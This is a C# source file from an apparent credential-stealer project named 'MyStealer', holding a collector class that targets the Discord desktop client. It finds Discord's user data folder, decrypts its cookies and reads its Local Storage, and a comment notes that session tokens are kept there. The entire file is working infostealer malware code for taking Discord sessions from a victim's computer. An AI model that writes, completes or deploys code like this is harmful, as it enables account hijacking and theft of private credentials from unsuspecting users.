using System.IO;
using System;
using System.Collections.Generic;

namespace MyStealer.Collectors.Browser.ChromiumBased
{
    // Discord is not a browser; it's a messenger
    // but it uses CEF as backend, and all credentials and session tokens are stored in cookies & local storage
    internal class Discord : Chromium
    {
        public override string ApplicationName => "Discord";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Discord");

        public ISet<CredentialEntry> GetCredentials() => new HashSet<CredentialEntry>(); // 'Login Data' file is not available

        public ISet<CookieEntry> GetCookies()
        {
            var set = new HashSet<CookieEntry>();
            foreach (var cookiePath in CookieFilePathList)
            {
                foreach (var cookie in DecryptCookies("master", Path.Combine(UserDataPath, cookiePath)))
                    set.Add(cookie);
            }

            return set;
        }

        public ISet<LocalStorageEntry> GetLocalStorageEntries()
        {
            var set = new HashSet<LocalStorageEntry>();
            foreach (var entry in ReadLocalStorage("master", Path.Combine(UserDataPath, "Local Storage", "leveldb")))
                set.Add(entry);

            return set;
        }
    }
}
